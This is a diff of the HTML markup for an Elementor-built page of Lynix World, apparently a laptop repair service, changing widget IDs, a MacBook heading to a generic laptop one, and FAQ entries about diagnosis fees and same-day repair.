+				<div class="elementor-element elementor-element-f4f04c0 service_card_heading elementor-widget elementor-widget-heading" data-id="f4f04c0" data-element_type="widget" data-widget_type="heading.default">
 					<h5 class="elementor-heading-title elementor-size-default">Feature</h5>				</div>
 				</div>
-		<div class="elementor-element elementor-element-314a585 e-con-full e-flex e-con e-child" data-id="314a585" data-element_type="container">
-				<div class="elementor-element elementor-element-c99c1bd service_card_heading elementor-widget elementor-widget-heading" data-id="c99c1bd" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-42aefab e-con-full e-flex e-con e-child" data-id="42aefab" data-element_type="container">
+				<div class="elementor-element elementor-element-92f2ac4 service_card_heading elementor-widget elementor-widget-heading" data-id="92f2ac4" data-element_type="widget" data-widget_type="heading.default">
 					<h5 class="elementor-heading-title elementor-size-default">Others</h5>				</div>
 				</div>
-		<div class="elementor-element elementor-element-b306349 e-con-full e-flex e-con e-child" data-id="b306349" data-element_type="container">
-				<div class="elementor-element elementor-element-e6140f3 service_card_heading elementor-widget elementor-widget-heading" data-id="e6140f3" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-d532540 e-con-full e-flex e-con e-child" data-id="d532540" data-element_type="container">
+				<div class="elementor-element elementor-element-81525f8 service_card_heading elementor-widget elementor-widget-heading" data-id="81525f8" data-element_type="widget" data-widget_type="heading.default">
 					<h5 class="elementor-heading-title elementor-size-default">Lynix World</h5>				</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-c461c12 e-con-full e-flex e-con e-child" data-id="c461c12" data-element_type="container">
-		<div class="elementor-element elementor-element-2b376e1 e-con-full e-flex e-con e-child" data-id="2b376e1" data-element_type="container">
-				<div class="elementor-element elementor-element-e1dab01 service_card_heading elementor-widget elementor-widget-heading" data-id="e1dab01" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-e70e216 e-con-full e-flex e-con e-child" data-id="e70e216" data-element_type="container">
+		<div class="elementor-element elementor-element-78c0b23 e-con-full e-flex e-con e-child" data-id="78c0b23" data-element_type="container">
+				<div class="elementor-element elementor-element-2212dd7 service_card_heading elementor-widget elementor-widget-heading" data-id="2212dd7" data-element_type="widget" data-widget_type="heading.default">
 					<p class="elementor-heading-title elementor-size-default">Same Day Repairs</p>				</div>
 				</div>
-		<div class="elementor-element elementor-element-8a59e48 e-con-full e-flex e-con e-child" data-id="8a59e48" data-element_type="container">
-				<div class="elementor-element elementor-element-d0a9757 elementor-view-default elementor-widget elementor-widget-icon" data-id="d0a9757" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-6e93ae2 e-con-full e-flex e-con e-child" data-id="6e93ae2" data-element_type="container">
+				<div class="elementor-element elementor-element-091d483 elementor-view-default elementor-widget elementor-widget-icon" data-id="091d483" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-window-close" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M464 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-83.6 290.5c4.8 4.8 4.8 12.6 0 17.4l-40.5 40.5c-4.8 4.8-12.6 4.8-17.4 0L256 313.3l-66.5 67.1c-4.8 4.8-12.6 4.8-17.4 0l-40.5-40.5c-4.8-4.8-4.8-12.6 0-17.4l67.1-66.5-67.1-66.5c-4.8-4.8-4.8-12.6 0-17.4l40.5-40.5c4.8-4.8 12.6-4.8 17.4 0l66.5 67.1 66.5-67.1c4.8-4.8 12.6-4.8 17.4 0l40.5 40.5c4.8 4.8 4.8 12.6 0 17.4L313.3 256l67.1 66.5z"></path></svg>			</div>
 		</div>
 						</div>
 				</div>
-		<div class="elementor-element elementor-element-dd8d370 e-con-full e-flex e-con e-child" data-id="dd8d370" data-element_type="container">
-				<div class="elementor-element elementor-element-70a7caf elementor-view-default elementor-widget elementor-widget-icon" data-id="70a7caf" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-474b824 e-con-full e-flex e-con e-child" data-id="474b824" data-element_type="container">
+				<div class="elementor-element elementor-element-d03a253 elementor-view-default elementor-widget elementor-widget-icon" data-id="d03a253" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-square" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M400 480H48c-26.51 0-48-21.49-48-48V80c0-26.51 21.49-48 48-48h352c26.51 0 48 21.49 48 48v352c0 26.51-21.49 48-48 48zm-204.686-98.059l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.248-16.379-6.249-22.628 0L184 302.745l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.25 16.379 6.25 22.628.001z"></path></svg>			</div>
@@ -567,21 +573,21 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 						</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-e57f489 e-con-full e-flex e-con e-child" data-id="e57f489" data-element_type="container">
-		<div class="elementor-element elementor-element-741263c e-con-full e-flex e-con e-child" data-id="741263c" data-element_type="container">
-				<div class="elementor-element elementor-element-08fb993 service_card_heading elementor-widget elementor-widget-heading" data-id="08fb993" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-7dc38bd e-con-full e-flex e-con e-child" data-id="7dc38bd" data-element_type="container">
+		<div class="elementor-element elementor-element-fa56a4a e-con-full e-flex e-con e-child" data-id="fa56a4a" data-element_type="container">
+				<div class="elementor-element elementor-element-898f601 service_card_heading elementor-widget elementor-widget-heading" data-id="898f601" data-element_type="widget" data-widget_type="heading.default">
 					<p class="elementor-heading-title elementor-size-default">Genuine Parts</p>				</div>
 				</div>
-		<div class="elementor-element elementor-element-bb3bc78 e-con-full e-flex e-con e-child" data-id="bb3bc78" data-element_type="container">
-				<div class="elementor-element elementor-element-dbbc5ad elementor-view-default elementor-widget elementor-widget-icon" data-id="dbbc5ad" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-69b8de3 e-con-full e-flex e-con e-child" data-id="69b8de3" data-element_type="container">
+				<div class="elementor-element elementor-element-d5a7f06 elementor-view-default elementor-widget elementor-widget-icon" data-id="d5a7f06" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-window-close" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M464 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-83.6 290.5c4.8 4.8 4.8 12.6 0 17.4l-40.5 40.5c-4.8 4.8-12.6 4.8-17.4 0L256 313.3l-66.5 67.1c-4.8 4.8-12.6 4.8-17.4 0l-40.5-40.5c-4.8-4.8-4.8-12.6 0-17.4l67.1-66.5-67.1-66.5c-4.8-4.8-4.8-12.6 0-17.4l40.5-40.5c4.8-4.8 12.6-4.8 17.4 0l66.5 67.1 66.5-67.1c4.8-4.8 12.6-4.8 17.4 0l40.5 40.5c4.8 4.8 4.8 12.6 0 17.4L313.3 256l67.1 66.5z"></path></svg>			</div>
 		</div>
 						</div>
 				</div>
-		<div class="elementor-element elementor-element-41a3724 e-con-full e-flex e-con e-child" data-id="41a3724" data-element_type="container">
-				<div class="elementor-element elementor-element-b0a5ea5 elementor-view-default elementor-widget elementor-widget-icon" data-id="b0a5ea5" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-abff4a2 e-con-full e-flex e-con e-child" data-id="abff4a2" data-element_type="container">
+				<div class="elementor-element elementor-element-3273389 elementor-view-default elementor-widget elementor-widget-icon" data-id="3273389" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-square" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M400 480H48c-26.51 0-48-21.49-48-48V80c0-26.51 21.49-48 48-48h352c26.51 0 48 21.49 48 48v352c0 26.51-21.49 48-48 48zm-204.686-98.059l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.248-16.379-6.249-22.628 0L184 302.745l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.25 16.379 6.25 22.628.001z"></path></svg>			</div>
@@ -589,21 +595,21 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 						</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-5ccae35 e-con-full e-flex e-con e-child" data-id="5ccae35" data-element_type="container">
-		<div class="elementor-element elementor-element-9f11e4e e-con-full e-flex e-con e-child" data-id="9f11e4e" data-element_type="container">
-				<div class="elementor-element elementor-element-41c39f0 service_card_heading elementor-widget elementor-widget-heading" data-id="41c39f0" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-446001b e-con-full e-flex e-con e-child" data-id="446001b" data-element_type="container">
+		<div class="elementor-element elementor-element-1c85ced e-con-full e-flex e-con e-child" data-id="1c85ced" data-element_type="container">
+				<div class="elementor-element elementor-element-c8fd2f2 service_card_heading elementor-widget elementor-widget-heading" data-id="c8fd2f2" data-element_type="widget" data-widget_type="heading.default">
 					<p class="elementor-heading-title elementor-size-default">Pay After Fix</p>				</div>
 				</div>
-		<div class="elementor-element elementor-element-4858a32 e-con-full e-flex e-con e-child" data-id="4858a32" data-element_type="container">
-				<div class="elementor-element elementor-element-f7049ff elementor-view-default elementor-widget elementor-widget-icon" data-id="f7049ff" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-dd89901 e-con-full e-flex e-con e-child" data-id="dd89901" data-element_type="container">
+				<div class="elementor-element elementor-element-ff95bfd elementor-view-default elementor-widget elementor-widget-icon" data-id="ff95bfd" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-window-close" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M464 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-83.6 290.5c4.8 4.8 4.8 12.6 0 17.4l-40.5 40.5c-4.8 4.8-12.6 4.8-17.4 0L256 313.3l-66.5 67.1c-4.8 4.8-12.6 4.8-17.4 0l-40.5-40.5c-4.8-4.8-4.8-12.6 0-17.4l67.1-66.5-67.1-66.5c-4.8-4.8-4.8-12.6 0-17.4l40.5-40.5c4.8-4.8 12.6-4.8 17.4 0l66.5 67.1 66.5-67.1c4.8-4.8 12.6-4.8 17.4 0l40.5 40.5c4.8 4.8 4.8 12.6 0 17.4L313.3 256l67.1 66.5z"></path></svg>			</div>
 		</div>
 						</div>
 				</div>
-		<div class="elementor-element elementor-element-c4af70f e-con-full e-flex e-con e-child" data-id="c4af70f" data-element_type="container">
-				<div class="elementor-element elementor-element-d53f97c elementor-view-default elementor-widget elementor-widget-icon" data-id="d53f97c" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-9e3d257 e-con-full e-flex e-con e-child" data-id="9e3d257" data-element_type="container">
+				<div class="elementor-element elementor-element-2011888 elementor-view-default elementor-widget elementor-widget-icon" data-id="2011888" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-square" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M400 480H48c-26.51 0-48-21.49-48-48V80c0-26.51 21.49-48 48-48h352c26.51 0 48 21.49 48 48v352c0 26.51-21.49 48-48 48zm-204.686-98.059l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.248-16.379-6.249-22.628 0L184 302.745l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.25 16.379 6.25 22.628.001z"></path></svg>			</div>
@@ -611,21 +617,21 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 						</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-3dc7cbb e-con-full e-flex e-con e-child" data-id="3dc7cbb" data-element_type="container">
-		<div class="elementor-element elementor-element-2039cdf e-con-full e-flex e-con e-child" data-id="2039cdf" data-element_type="container">
-				<div class="elementor-element elementor-element-aea3656 service_card_heading elementor-widget elementor-widget-heading" data-id="aea3656" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-444903f e-con-full e-flex e-con e-child" data-id="444903f" data-element_type="container">
+		<div class="elementor-element elementor-element-46d0984 e-con-full e-flex e-con e-child" data-id="46d0984" data-element_type="container">
+				<div class="elementor-element elementor-element-6bf722d service_card_heading elementor-widget elementor-widget-heading" data-id="6bf722d" data-element_type="widget" data-widget_type="heading.default">
 					<p class="elementor-heading-title elementor-size-default">Free Diagnosis</p>				</div>
 				</div>
-		<div class="elementor-element elementor-element-fc1ce4e e-con-full e-flex e-con e-child" data-id="fc1ce4e" data-element_type="container">
-				<div class="elementor-element elementor-element-618eea6 elementor-view-default elementor-widget elementor-widget-icon" data-id="618eea6" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-4b6bd6c e-con-full e-flex e-con e-child" data-id="4b6bd6c" data-element_type="container">
+				<div class="elementor-element elementor-element-46890cc elementor-view-default elementor-widget elementor-widget-icon" data-id="46890cc" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-window-close" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M464 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h416c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-83.6 290.5c4.8 4.8 4.8 12.6 0 17.4l-40.5 40.5c-4.8 4.8-12.6 4.8-17.4 0L256 313.3l-66.5 67.1c-4.8 4.8-12.6 4.8-17.4 0l-40.5-40.5c-4.8-4.8-4.8-12.6 0-17.4l67.1-66.5-67.1-66.5c-4.8-4.8-4.8-12.6 0-17.4l40.5-40.5c4.8-4.8 12.6-4.8 17.4 0l66.5 67.1 66.5-67.1c4.8-4.8 12.6-4.8 17.4 0l40.5 40.5c4.8 4.8 4.8 12.6 0 17.4L313.3 256l67.1 66.5z"></path></svg>			</div>
 		</div>
 						</div>
 				</div>
-		<div class="elementor-element elementor-element-9fa3800 e-con-full e-flex e-con e-child" data-id="9fa3800" data-element_type="container">
-				<div class="elementor-element elementor-element-5217f35 elementor-view-default elementor-widget elementor-widget-icon" data-id="5217f35" data-element_type="widget" data-widget_type="icon.default">
+		<div class="elementor-element elementor-element-90a1573 e-con-full e-flex e-con e-child" data-id="90a1573" data-element_type="container">
+				<div class="elementor-element elementor-element-bf4f48d elementor-view-default elementor-widget elementor-widget-icon" data-id="bf4f48d" data-element_type="widget" data-widget_type="icon.default">
 							<div class="elementor-icon-wrapper">
 			<div class="elementor-icon">
 			<svg aria-hidden="true" class="e-font-icon-svg e-fas-check-square" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M400 480H48c-26.51 0-48-21.49-48-48V80c0-26.51 21.49-48 48-48h352c26.51 0 48 21.49 48 48v352c0 26.51-21.49 48-48 48zm-204.686-98.059l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.248-16.379-6.249-22.628 0L184 302.745l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.25 16.379 6.25 22.628.001z"></path></svg>			</div>
@@ -636,50 +642,50 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-70cc3f4 e-flex e-con-boxed e-con e-parent" data-id="70cc3f4" data-element_type="container">
+		<div class="elementor-element elementor-element-a1a5e31 e-flex e-con-boxed e-con e-parent" data-id="a1a5e31" data-element_type="container">
 					<div class="e-con-inner">
-		<div class="elementor-element elementor-element-8a42a1b e-con-full e-flex e-con e-child" data-id="8a42a1b" data-element_type="container">
-				<div class="elementor-element elementor-element-8cbffae service_card_heading elementor-widget elementor-widget-heading" data-id="8cbffae" data-element_type="widget" data-widget_type="heading.default">
-					<h5 class="elementor-heading-title elementor-size-default">Trouble with your MacBook?</h5>				</div>
-		<div class="elementor-element elementor-element-963c7b2 e-con-full e-flex e-con e-child" data-id="963c7b2" data-element_type="container">
-		<div class="elementor-element elementor-element-e76353f e-con-full e-flex e-con e-child" data-id="e76353f" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-d105554 elementor-widget elementor-widget-image" data-id="d105554" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-ec04aef e-con-full e-flex e-con e-child" data-id="ec04aef" data-element_type="container">
+				<div class="elementor-element elementor-element-4dac280 service_card_heading elementor-widget elementor-widget-heading" data-id="4dac280" data-element_type="widget" data-widget_type="heading.default">
+					<h5 class="elementor-heading-title elementor-size-default">Trouble with your Laptop?</h5>				</div>
+		<div class="elementor-element elementor-element-1ec4ed7 e-con-full e-flex e-con e-child" data-id="1ec4ed7" data-element_type="container">
+		<div class="elementor-element elementor-element-6752ba6 e-con-full e-flex e-con e-child" data-id="6752ba6" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-4348a07 elementor-widget elementor-widget-image" data-id="4348a07" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/appointment.png" class="attachment-full size-full wp-image-9932" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/appointment.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/appointment-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/appointment-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-1440424 elementor-widget elementor-widget-text-editor" data-id="1440424" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-aaec811 elementor-widget elementor-widget-text-editor" data-id="aaec811" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Step 1</p>								</div>
-				<div class="elementor-element elementor-element-209e8fc elementor-widget elementor-widget-text-editor" data-id="209e8fc" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-7e36a32 elementor-widget elementor-widget-text-editor" data-id="7e36a32" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Book your repair online or on WhatsApp</p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-e29419a e-con-full e-flex e-con e-child" data-id="e29419a" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-bc4656f elementor-widget elementor-widget-image" data-id="bc4656f" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-1b3d339 e-con-full e-flex e-con e-child" data-id="1b3d339" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-8b8185d elementor-widget elementor-widget-image" data-id="8b8185d" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/technician.png" class="attachment-full size-full wp-image-9931" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/technician.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/technician-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/technician-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-0e86c0a elementor-widget elementor-widget-text-editor" data-id="0e86c0a" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-0250dd2 elementor-widget elementor-widget-text-editor" data-id="0250dd2" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Step 2</p>								</div>
-				<div class="elementor-element elementor-element-518419c elementor-widget elementor-widget-text-editor" data-id="518419c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-339f077 elementor-widget elementor-widget-text-editor" data-id="339f077" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Technician visits your home/office</p>								</div>
 				</div>
-		<div class="elementor-element elementor-element-fa58bf4 e-con-full e-flex e-con e-child" data-id="fa58bf4" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-cb31ecc elementor-widget elementor-widget-image" data-id="cb31ecc" data-element_type="widget" data-widget_type="image.default">
+		<div class="elementor-element elementor-element-6c1134b e-con-full e-flex e-con e-child" data-id="6c1134b" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-ca09532 elementor-widget elementor-widget-image" data-id="ca09532" data-element_type="widget" data-widget_type="image.default">
 															<img loading="lazy" decoding="async" width="512" height="512" src="https://lynixworld.com/wp-content/uploads/2025/07/shield.png" class="attachment-full size-full wp-image-9930" alt="" srcset="https://lynixworld.com/wp-content/uploads/2025/07/shield.png 512w, https://lynixworld.com/wp-content/uploads/2025/07/shield-300x300.png 300w, https://lynixworld.com/wp-content/uploads/2025/07/shield-150x150.png 150w" sizes="(max-width: 512px) 100vw, 512px" />															</div>
-				<div class="elementor-element elementor-element-c95e23f elementor-widget elementor-widget-text-editor" data-id="c95e23f" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-9a3e4c7 elementor-widget elementor-widget-text-editor" data-id="9a3e4c7" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Step 3</p>								</div>
-				<div class="elementor-element elementor-element-17d4302 elementor-widget elementor-widget-text-editor" data-id="17d4302" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-1d70d29 elementor-widget elementor-widget-text-editor" data-id="1d70d29" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Device fixed on-site or picked up safely</p>								</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-9a948a8 e-con-full e-flex e-con e-child" data-id="9a948a8" data-element_type="container">
-		<div class="elementor-element elementor-element-8361ac1 e-con-full e-flex e-con e-child" data-id="8361ac1" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-2c762a6 elementor-widget elementor-widget-text-editor" data-id="2c762a6" data-element_type="widget" data-widget_type="text-editor.default">
+		<div class="elementor-element elementor-element-c0f40a8 e-con-full e-flex e-con e-child" data-id="c0f40a8" data-element_type="container">
+		<div class="elementor-element elementor-element-e991bc6 e-con-full e-flex e-con e-child" data-id="e991bc6" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-8457135 elementor-widget elementor-widget-text-editor" data-id="8457135" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Why People Trust Lynix World</p>								</div>
-				<div class="elementor-element elementor-element-0a36b94 elementor-widget elementor-widget-text-editor" data-id="0a36b94" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-element elementor-element-7fbe7c2 elementor-widget elementor-widget-text-editor" data-id="7fbe7c2" data-element_type="widget" data-widget_type="text-editor.default">
 									<p>Rated 4.9/5 by 12,000+ Happy Customers</p><p>✅ Free Diagnosis | No Fix, No Fee | 3–12 Months Warranty</p><p>🔒 Secure Booking 🚚 Doorstep Service 🔧 Expert Technicians</p>								</div>
 				</div>
 				</div>
 				</div>
-		<div class="elementor-element elementor-element-8e6c7f5 e-con-full e-flex e-con e-child" data-id="8e6c7f5" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
-				<div class="elementor-element elementor-element-1468992 elementor-widget elementor-widget-heading" data-id="1468992" data-element_type="widget" data-widget_type="heading.default">
+		<div class="elementor-element elementor-element-bda4ac8 e-con-full e-flex e-con e-child" data-id="bda4ac8" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-6252dd4 elementor-widget elementor-widget-heading" data-id="6252dd4" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default">Book An  <span style="color:#FE6E00"> Appointment </span></h2>				</div>
-				<div class="elementor-element elementor-element-6e4b87e elementor-widget elementor-widget-shortcode" data-id="6e4b87e" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-element elementor-element-87e6dcb elementor-widget elementor-widget-shortcode" data-id="87e6dcb" data-element_type="widget" data-widget_type="shortcode.default">
 							<div class="elementor-shortcode">		<div data-elementor-type="section" data-elementor-id="10255" class="elementor elementor-10255" data-elementor-post-type="elementor_library">
 			<div class="elementor-element elementor-element-79a9bfa e-flex e-con-boxed e-con e-parent" data-id="79a9bfa" data-element_type="container">
 					<div class="e-con-inner">
@@ -847,66 +853,67 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16
 				</div>
 					</div>
 				</div>
-		<div class="elementor-element elementor-element-67c59a6 e-flex e-con-boxed e-con e-parent" data-id="67c59a6" data-element_type="container">
+		<div class="elementor-element elementor-element-c51406e e-flex e-con-boxed e-con e-parent" data-id="c51406e" data-element_type="container">
 					<div class="e-con-inner">
-				<div class="elementor-element elementor-element-c9addfa elementor-widget elementor-widget-heading" data-id="c9addfa" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-element elementor-element-cbe42ce elementor-widget elementor-widget-heading" data-id="cbe42ce" data-element_type="widget" data-widget_type="heading.default">
 					<h2 class="elementor-heading-title elementor-size-default"><span style="color:#FE6E00">Lynix World</span> Frequently Answered Questions</h2>				</div>
-				<div class="elementor-element elementor-element-11000d7 elementor-widget elementor-widget-accordion" data-id="11000d7" data-element_type="widget" data-widget_type="accordion.default">
+				<div class="elementor-element elementor-element-595ba4a elementor-widget elementor-widget-accordion" data-id="595ba4a" data-element_type="widget" data-widget_type="accordion.default">
 							<div class="elementor-accordion">
 							<div class="elementor-accordion-item">
-					<div id="elementor-tab-title-1781" class="elementor-tab-title" data-tab="1" role="button" aria-controls="elementor-tab-content-1781" aria-expanded="false">
+					<div id="elementor-tab-title-9361" class="elementor-tab-title" data-tab="1" role="button" aria-controls="elementor-tab-content-9361" aria-expanded="false">
 													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
 															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 								<span class="elementor-accordion-icon-opened"><svg class="e-font-icon-svg e-fas-minus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
 														</span>
-												<a class="elementor-accordion-title" tabindex="0">Do you charge any fee for diagnosis?</a>
+												<a class="elementor-accordion-title" tabindex="0">Can I get my laptop fixed on the same day?</a>
 					</div>
-					<div id="elementor-tab-content-1781" class="elementor-tab-content elementor-clearfix" data-tab="1" role="region" aria-labelledby="elementor-tab-title-1781"><p><span style="font-weight: 400;">No diagnosis and visiting charges.</span></p></div>
+					<div id="elementor-tab-content-9361" class="elementor-tab-content elementor-clearfix" data-tab="1" role="region" aria-labelledby="elementor-tab-title-9361"><p><span style="font-weight: 400;">Yes, sometimes it can take 48-72 hours.</span></p></div>
 				</div>
 							<div class="elementor-accordion-item">
-					<div id="elementor-tab-title-1782" class="elementor-tab-title" data-tab="2" role="button" aria-controls="elementor-tab-content-1782" aria-expanded="false">
+					<div id="elementor-tab-title-9362" class="elementor-tab-title" data-tab="2" role="button" aria-controls="elementor-tab-content-9362" aria-expanded="false">
 													<span class="elementor-accordion-icon elementor-accordion-icon-left" aria-hidden="true">
 															<span class="elementor-accordion-icon-closed"><svg class="e-font-icon-svg e-fas-plus" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 208H272V64c0-17.67-14.33-32-32-32h-32c-17.67 0-32 14.33-32 32v144H32c-17.67 0-32 14.33-32 32v32c0 17.67 14.33 32 32 32h144v144c0 17.67 14.33 32 32 32h32c17.67 0 32-14.33 32-32V304h144c17.67 0 32-14.33 32-32v-32c0-17.67-14.33-32-32-32z"></path></svg></span>
